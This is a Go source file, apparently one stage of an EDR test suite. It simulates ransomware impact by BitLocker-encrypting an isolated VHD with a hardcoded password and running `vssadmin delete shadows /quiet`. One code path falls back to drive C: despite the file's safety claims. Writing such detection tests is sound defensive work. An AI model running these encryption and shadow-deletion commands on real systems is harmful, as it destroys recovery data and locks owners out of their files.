//go:build windows
// +build windows

// Stage 3: Impact
// MITRE ATT&CK: T1486 (Data Encrypted for Impact), T1490 (Inhibit System Recovery)
//
// This stage simulates ransomware impact techniques using VHD-based isolation:
// 1. Create 100MB VHD at C:\F0\bitlocker_test.vhd using diskpart
// 2. Initialize, partition, and format VHD as NTFS
// 3. Mount VHD as next available drive letter
// 4. Create test files on VHD
// 5. Enable BitLocker: manage-bde -on <drive> -Password "F0RT1KA-Recovery-2024!" -UsedSpaceOnly
// 6. Execute vssadmin delete shadows /for=<drive> /quiet (VHD has no shadows)
// 7. Cleanup: decrypt, dismount, delete VHD
//
// SAFETY:
// - VHD-based isolation: All operations on isolated VHD
// - VHD has no real shadow copies to delete
// - Complete cleanup after test
// - No impact to real system drives
//
// EXIT CODES:
//   0   - Technique succeeded
//   126 - Technique blocked by EDR
//   105 - Binary quarantined
//   999 - Prerequisites not met (not admin, BitLocker not available)

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "581e0f20-13f0-4374-9686-be3abd110ae0"
	STAGE_ID       = 3
	TECHNIQUE_IDS  = "T1486, T1490"
	TECHNIQUE_NAME = "Impact"

	// VHD configuration
	VHD_PATH     = "C:\\F0\\bitlocker_test.vhd"
	VHD_SIZE_MB  = 100
	VHD_LABEL    = "F0RT1KA-TEST"
	BITLOCKER_PASSWORD = "F0RT1KA-Recovery-2024!"
)

// Standardized exit codes
const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

// Global variable to track VHD mount point for cleanup
var vhdDriveLetter string

func main() {
	// Attach to shared log file
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_IDS))

	fmt.Printf("[STAGE %d] Starting %s\n", STAGE_ID, TECHNIQUE_NAME)
	fmt.Printf("[STAGE %d] Techniques: %s\n", STAGE_ID, TECHNIQUE_IDS)
	fmt.Println()
	fmt.Println("SAFETY: All operations use isolated VHD - no real system impact")
	fmt.Println()

	LogMessage("INFO", TECHNIQUE_IDS, fmt.Sprintf("Starting %s (VHD-isolated)", TECHNIQUE_NAME))

	// Check prerequisites
	if !isAdmin() {
		fmt.Printf("[STAGE %d] ERROR: Administrator privileges required\n", STAGE_ID)
		LogMessage("ERROR", TECHNIQUE_IDS, "Administrator privileges required")
		LogStageEnd(STAGE_ID, "T1486", "error", "Not running as administrator")
		os.Exit(StageError)
	}

	fmt.Printf("[STAGE %d] Running with administrator privileges\n", STAGE_ID)
	fmt.Println()

	// Check BitLocker availability
	fmt.Println("=== Checking BitLocker Availability ===")
	if !checkBitLockerAvailable() {
		fmt.Printf("[STAGE %d] ERROR: BitLocker is not available on this system\n", STAGE_ID)
		fmt.Println("  This may be Windows Home edition or BitLocker is not installed")
		LogMessage("ERROR", TECHNIQUE_IDS, "BitLocker not available - Windows Home or feature not installed")
		LogStageEnd(STAGE_ID, "T1486", "error", "BitLocker not available")
		os.Exit(StageError)
	}
	fmt.Println("  BitLocker is available")
	fmt.Println()

	// Phase 1: Create VHD
	fmt.Println("=== Phase 1: Create Isolated VHD ===")
	fmt.Println()

	if err := createVHD(); err != nil {
		fmt.Printf("[STAGE %d] VHD creation failed: %v\n", STAGE_ID, err)
		LogMessage("ERROR", "T1486", fmt.Sprintf("VHD creation failed: %v", err))

		if isBlockedError(err) {
			LogStageBlocked(STAGE_ID, "T1486", err.Error())
			cleanup() // Attempt cleanup
			os.Exit(StageBlocked)
		}

		cleanup()
		LogStageEnd(STAGE_ID, "T1486", "error", err.Error())
		os.Exit(StageError)
	}

	fmt.Printf("[STAGE %d] VHD created and mounted at %s:\n", STAGE_ID, vhdDriveLetter)
	fmt.Println()

	// Phase 2: Create test files on VHD
	fmt.Println("=== Phase 2: Create Test Files ===")
	fmt.Println()

	if err := createTestFiles(); err != nil {
		fmt.Printf("[STAGE %d] Warning: Test file creation failed: %v\n", STAGE_ID, err)
		LogMessage("WARNING", "T1486", fmt.Sprintf("Test file creation failed: %v", err))
		// Continue - not fatal
	}
	fmt.Println()

	// Phase 3: Enable BitLocker (T1486 - Data Encrypted for Impact)
	fmt.Println("=== T1486: Data Encrypted for Impact ===")
	fmt.Println()

	if err := enableBitLocker(); err != nil {
		fmt.Printf("[STAGE %d] BitLocker encryption failed: %v\n", STAGE_ID, err)
		LogMessage("ERROR", "T1486", fmt.Sprintf("BitLocker encryption failed: %v", err))

		if isBlockedError(err) {
			LogStageBlocked(STAGE_ID, "T1486", err.Error())
			cleanup()
			os.Exit(StageBlocked)
		}

		cleanup()
		LogStageEnd(STAGE_ID, "T1486", "error", err.Error())
		os.Exit(StageError)
	}

	fmt.Printf("[STAGE %d] BitLocker encryption initiated\n", STAGE_ID)
	fmt.Println()

	// Phase 4: VSS Shadow Deletion (T1490 - Inhibit System Recovery)
	fmt.Println("=== T1490: Inhibit System Recovery ===")
	fmt.Println()

	if err := deleteVolumeShadows(); err != nil {
		fmt.Printf("[STAGE %d] VSS deletion returned: %v\n", STAGE_ID, err)
		// Note: This is expected to "fail" because VHD has no shadows
		// The important part is that the command was executed (triggers detection)

		if isBlockedError(err) {
			LogStageBlocked(STAGE_ID, "T1490", err.Error())
			cleanup()
			os.Exit(StageBlocked)
		}

		// Log but don't fail - no shadows on VHD is expected
		LogMessage("INFO", "T1490", "VSS deletion command executed (no shadows on VHD)")
	}
	fmt.Println()

	// Phase 5: Cleanup
	fmt.Println("=== Phase 5: Cleanup ===")
	fmt.Println()

	cleanup()
	fmt.Println()

	// All techniques succeeded
	fmt.Printf("[STAGE %d] Impact techniques completed successfully\n", STAGE_ID)
	fmt.Println("  - BitLocker encryption executed on isolated VHD")
	fmt.Println("  - VSS shadow deletion attempted")
	fmt.Println("  - VHD cleaned up")
	LogMessage("SUCCESS", TECHNIQUE_IDS, "Impact techniques executed successfully")
	LogStageEnd(STAGE_ID, "T1486", "success", "Impact completed without prevention")
	os.Exit(StageSuccess)
}

// checkBitLockerAvailable verifies BitLocker is available
func checkBitLockerAvailable() bool {
	cmd := exec.Command("where", "manage-bde")
	err := cmd.Run()
	if err != nil {
		return false
	}

	// Try running manage-bde to verify it works
	cmd = exec.Command("manage-bde", "-status")
	err = cmd.Run()
	// If manage-bde exists, it should at least show status (even if error)
	return true
}

// createVHD creates and mounts a VHD for BitLocker testing
func createVHD() error {
	fmt.Println("  [1/5] Checking for existing VHD...")

	// Remove any existing VHD first
	if _, err := os.Stat(VHD_PATH); err == nil {
		fmt.Println("        Removing existing VHD...")
		// Try to detach first
		detachScript := fmt.Sprintf(`
select vdisk file="%s"
detach vdisk
`, VHD_PATH)
		runDiskpart(detachScript)
		os.Remove(VHD_PATH)
	}

	fmt.Println("  [2/5] Creating VHD file...")

	// Create diskpart script for VHD creation
	createScript := fmt.Sprintf(`
create vdisk file="%s" maximum=%d type=expandable
select vdisk file="%s"
attach vdisk
create partition primary
format fs=ntfs label="%s" quick
assign
`, VHD_PATH, VHD_SIZE_MB, VHD_PATH, VHD_LABEL)

	output, err := runDiskpart(createScript)
	if err != nil {
		// Check if this is a block
		if strings.Contains(strings.ToLower(output), "access denied") ||
			strings.Contains(strings.ToLower(output), "blocked") {
			return fmt.Errorf("VHD creation blocked: %s", output)
		}
		return fmt.Errorf("diskpart failed: %v - %s", err, output)
	}

	LogProcessExecution("diskpart", "create vdisk", 0, true, 0, output)
	fmt.Println("        VHD created and attached")

	fmt.Println("  [3/5] Finding mounted drive letter...")

	// Find the drive letter assigned to the VHD
	time.Sleep(2 * time.Second) // Give Windows time to mount

	letter, err := findVHDDriveLetter()
	if err != nil {
		return fmt.Errorf("could not find VHD drive letter: %v", err)
	}

	vhdDriveLetter = letter
	fmt.Printf("        VHD mounted at: %s:\n", vhdDriveLetter)
	LogMessage("INFO", "T1486", fmt.Sprintf("VHD mounted at %s:", vhdDriveLetter))

	return nil
}

// runDiskpart executes a diskpart script
func runDiskpart(script string) (string, error) {
	// Write script to temp file
	scriptPath := filepath.Join(os.TempDir(), "f0rt1ka_diskpart.txt")
	err := os.WriteFile(scriptPath, []byte(script), 0644)
	if err != nil {
		return "", fmt.Errorf("failed to write diskpart script: %v", err)
	}
	defer os.Remove(scriptPath)

	// Run diskpart
	cmd := exec.Command("diskpart", "/s", scriptPath)
	output, err := cmd.CombinedOutput()

	return string(output), err
}

// findVHDDriveLetter finds the drive letter of the mounted VHD
func findVHDDriveLetter() (string, error) {
	// Query mounted volumes using wmic
	cmd := exec.Command("wmic", "volume", "where", fmt.Sprintf("Label='%s'", VHD_LABEL), "get", "DriveLetter", "/format:list")
	output, err := cmd.CombinedOutput()
	outputStr := string(output)

	if err == nil {
		for _, line := range strings.Split(outputStr, "\n") {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "DriveLetter=") {
				letter := strings.TrimPrefix(line, "DriveLetter=")
				letter = strings.TrimSuffix(letter, ":")
				letter = strings.TrimSpace(letter)
				if letter != "" {
					return letter, nil
				}
			}
		}
	}

	// Fallback: Try common drive letters
	for _, letter := range "VWXYZ" {
		drivePath := fmt.Sprintf("%c:\\", letter)
		if _, err := os.Stat(drivePath); err == nil {
			// Check if this drive has our label
			cmd := exec.Command("vol", fmt.Sprintf("%c:", letter))
			volOutput, _ := cmd.CombinedOutput()
			if strings.Contains(string(volOutput), VHD_LABEL) {
				return string(letter), nil
			}
		}
	}

	return "", fmt.Errorf("VHD drive letter not found")
}

// createTestFiles creates test files on the VHD
func createTestFiles() error {
	if vhdDriveLetter == "" {
		return fmt.Errorf("VHD not mounted")
	}

	drivePath := fmt.Sprintf("%s:\\", vhdDriveLetter)

	fmt.Println("  Creating test files on VHD...")

	// Create test directory
	testDir := filepath.Join(drivePath, "TestData")
	if err := os.MkdirAll(testDir, 0755); err != nil {
		return fmt.Errorf("failed to create test directory: %v", err)
	}

	// Create some test files
	testFiles := map[string]string{
		"document.txt":  "This is a test document for F0RT1KA ransomware simulation.\nThis file will be encrypted using BitLocker.\n",
		"data.csv":      "id,name,value\n1,test1,100\n2,test2,200\n3,test3,300\n",
		"config.json":   `{"test": true, "simulation": "bitlocker-ransomware", "uuid": "581e0f20-13f0-4374-9686-be3abd110ae0"}`,
		"important.doc": "IMPORTANT DOCUMENT - F0RT1KA Security Test\n\nThis simulates a victim file that would be encrypted by ransomware.\n",
	}

	for filename, content := range testFiles {
		filePath := filepath.Join(testDir, filename)
		if err := os.WriteFile(filePath, []byte(content), 0644); err != nil {
			fmt.Printf("        Warning: Failed to create %s: %v\n", filename, err)
		} else {
			fmt.Printf("        Created: %s\n", filePath)
			LogFileDropped(filename, filePath, int64(len(content)), false)
		}
	}

	LogMessage("INFO", "T1486", fmt.Sprintf("Created test files in %s", testDir))
	return nil
}

// enableBitLocker enables BitLocker on the VHD
func enableBitLocker() error {
	if vhdDriveLetter == "" {
		return fmt.Errorf("VHD not mounted")
	}

	drive := fmt.Sprintf("%s:", vhdDriveLetter)

	fmt.Printf("  [1/2] Enabling BitLocker on %s...\n", drive)
	fmt.Printf("        Password: %s\n", BITLOCKER_PASSWORD)

	// Enable BitLocker with password protector
	// Using -UsedSpaceOnly for faster encryption
	cmd := exec.Command("manage-bde", "-on", drive,
		"-Password", BITLOCKER_PASSWORD,
		"-UsedSpaceOnly")

	output, err := cmd.CombinedOutput()
	outputStr := string(output)

	fmt.Printf("        Output: %s\n", strings.TrimSpace(outputStr))

	LogProcessExecution("manage-bde", fmt.Sprintf("manage-bde -on %s -Password", drive), 0, err == nil, 0, outputStr)

	if err != nil {
		// Check if blocked
		if strings.Contains(strings.ToLower(outputStr), "access denied") ||
			strings.Contains(strings.ToLower(outputStr), "blocked") ||
			strings.Contains(strings.ToLower(outputStr), "prevented") {
			return fmt.Errorf("BitLocker blocked: %s", outputStr)
		}

		// Some errors are acceptable - BitLocker might already be encrypting
		if strings.Contains(outputStr, "Encryption is already in progress") ||
			strings.Contains(outputStr, "already being encrypted") {
			fmt.Println("        BitLocker encryption already in progress")
			LogMessage("INFO", "T1486", "BitLocker encryption already in progress")
			return nil
		}

		// Check for common errors
		if strings.Contains(strings.ToLower(outputStr), "not supported") ||
			strings.Contains(strings.ToLower(outputStr), "cannot be used") {
			return fmt.Errorf("BitLocker not supported on this volume: %s", outputStr)
		}

		return fmt.Errorf("manage-bde failed: %v - %s", err, outputStr)
	}

	fmt.Println("  [2/2] BitLocker encryption initiated")
	fmt.Println("        Note: Full encryption takes time; using UsedSpaceOnly for speed")

	LogMessage("SUCCESS", "T1486", fmt.Sprintf("BitLocker encryption initiated on %s", drive))
	return nil
}

// deleteVolumeShadows attempts to delete volume shadow copies
func deleteVolumeShadows() error {
	if vhdDriveLetter == "" {
		// If VHD isn't mounted, try to delete shadows on C: (will be blocked by EDR typically)
		fmt.Println("  Note: VHD not mounted, attempting shadow deletion on current drive")
	}

	drive := fmt.Sprintf("%s:", vhdDriveLetter)
	if vhdDriveLetter == "" {
		drive = "C:" // Fallback, though this should trigger EDR
	}

	fmt.Printf("  [1/1] Executing vssadmin delete shadows for %s...\n", drive)
	fmt.Println("        Note: VHD has no shadows - command triggers detection only")

	// Execute vssadmin delete shadows
	// This triggers T1490 detection even though VHD has no shadows
	cmd := exec.Command("vssadmin", "delete", "shadows", fmt.Sprintf("/for=%s", drive), "/quiet")

	output, err := cmd.CombinedOutput()
	outputStr := string(output)

	fmt.Printf("        Output: %s\n", strings.TrimSpace(outputStr))

	LogProcessExecution("vssadmin", fmt.Sprintf("vssadmin delete shadows /for=%s /quiet", drive), 0, err == nil, 0, outputStr)

	if err != nil {
		// Check if blocked
		if strings.Contains(strings.ToLower(outputStr), "access denied") ||
			strings.Contains(strings.ToLower(outputStr), "blocked") ||
			strings.Contains(strings.ToLower(outputStr), "prevented") {
			return fmt.Errorf("VSS deletion blocked: %s", outputStr)
		}

		// "No shadow copies were found" is expected for VHD
		if strings.Contains(outputStr, "No shadow copies") ||
			strings.Contains(outputStr, "no items match") {
			fmt.Println("        Expected: No shadow copies on VHD")
			LogMessage("INFO", "T1490", "VSS deletion executed - no shadows on VHD (expected)")
			return nil
		}

		return fmt.Errorf("vssadmin failed: %v - %s", err, outputStr)
	}

	LogMessage("SUCCESS", "T1490", fmt.Sprintf("VSS shadow deletion executed for %s", drive))
	return nil
}

// cleanup performs cleanup operations
func cleanup() {
	fmt.Println("  [1/4] Decrypting BitLocker (if encrypted)...")

	if vhdDriveLetter != "" {
		drive := fmt.Sprintf("%s:", vhdDriveLetter)

		// Try to disable BitLocker
		cmd := exec.Command("manage-bde", "-off", drive)
		output, _ := cmd.CombinedOutput()
		fmt.Printf("        %s\n", strings.TrimSpace(string(output)))

		// Wait a moment for decryption to start
		time.Sleep(2 * time.Second)

		// Force unlock if needed
		cmd = exec.Command("manage-bde", "-unlock", drive, "-Password", BITLOCKER_PASSWORD)
		cmd.Run() // Ignore errors
	}

	fmt.Println("  [2/4] Detaching VHD...")

	if _, err := os.Stat(VHD_PATH); err == nil {
		detachScript := fmt.Sprintf(`
select vdisk file="%s"
detach vdisk
`, VHD_PATH)
		output, err := runDiskpart(detachScript)
		if err != nil {
			fmt.Printf("        Warning: Detach may have failed: %v\n", err)
		} else {
			fmt.Printf("        %s\n", strings.TrimSpace(output))
		}

		LogProcessExecution("diskpart", "detach vdisk", 0, err == nil, 0, output)
	}

	fmt.Println("  [3/4] Deleting VHD file...")

	time.Sleep(1 * time.Second) // Give Windows time to release the file

	if err := os.Remove(VHD_PATH); err != nil {
		if !os.IsNotExist(err) {
			fmt.Printf("        Warning: Could not delete VHD: %v\n", err)
		}
	} else {
		fmt.Printf("        Deleted: %s\n", VHD_PATH)
	}

	fmt.Println("  [4/4] Cleanup complete")
	LogMessage("INFO", "Cleanup", "VHD cleanup completed")
}

// isAdmin checks if the current process has administrator privileges
func isAdmin() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

// isBlockedError checks if an error indicates EDR blocking
func isBlockedError(err error) bool {
	if err == nil {
		return false
	}

	errStr := strings.ToLower(err.Error())
	blockPatterns := []string{
		"access denied",
		"access is denied",
		"permission denied",
		"blocked",
		"prevented",
		"not allowed",
		"operation not permitted",
	}

	for _, pattern := range blockPatterns {
		if strings.Contains(errStr, pattern) {
			return true
		}
	}

	return false
}
